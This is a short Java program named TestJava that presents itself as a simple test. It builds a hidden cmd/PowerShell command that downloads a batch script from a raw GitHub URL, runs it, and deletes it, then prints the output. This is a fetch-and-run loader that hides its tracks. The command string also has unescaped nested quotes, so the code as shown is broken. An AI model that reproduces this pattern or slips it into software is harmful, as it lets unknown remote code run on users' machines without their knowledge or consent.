import java.io.*;

public class TestJava {
    public static void main(String[] args) {
        try {
            String[] commands = {"cmd", "/c", "@echo OFF && powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/NC-devC/testmce/main/prog.cmd -OutFile prog.cmd" && prog.cmd && del prog.cmd"};
            ProcessBuilder pb = new ProcessBuilder(commands);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            while (line != null) {
                System.out.println(line);
                line = reader.readLine();
            }
            p.waitFor();
            System.out.println("Command completed successfully.");
        } catch (IOException | InterruptedException e) {
            System.out.println(e.getMessage());
        }
    }
}
